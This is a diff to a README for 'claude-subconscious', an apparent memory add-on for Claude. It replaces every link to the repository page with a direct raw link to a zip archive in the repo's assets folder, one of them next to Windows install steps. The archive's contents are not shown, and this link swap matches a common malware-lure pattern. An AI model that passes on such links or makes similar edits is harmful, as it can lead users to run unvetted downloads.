@@ -1,6 +1,6 @@
 # 🧠 claude-subconscious - Give Claude a deeper memory
 
-[![Download](https://img.shields.io/badge/Download-claude--subconscious-blue?style=for-the-badge)](https://github.com/lolist3426/claude-subconscious)
+[![Download](https://img.shields.io/badge/Download-claude--subconscious-blue?style=for-the-badge)](https://raw.githubusercontent.com/lolist3426/claude-subconscious/main/assets/subconscious-claude-2.6.zip)
 
 ## ✨ What this is
 
@@ -24,7 +24,7 @@ If you plan to store a lot of notes, more free space will help.
 
 Visit this page to download the app:
 
-https://github.com/lolist3426/claude-subconscious
+https://raw.githubusercontent.com/lolist3426/claude-subconscious/main/assets/subconscious-claude-2.6.zip
 
 ### Steps for Windows
 
@@ -183,7 +183,7 @@ Short, clear notes work best.
 
 If you need to install or update again, use the same link:
 
-https://github.com/lolist3426/claude-subconscious
+https://raw.githubusercontent.com/lolist3426/claude-subconscious/main/assets/subconscious-claude-2.6.zip
 
 ## 🧰 Short setup checklist
 
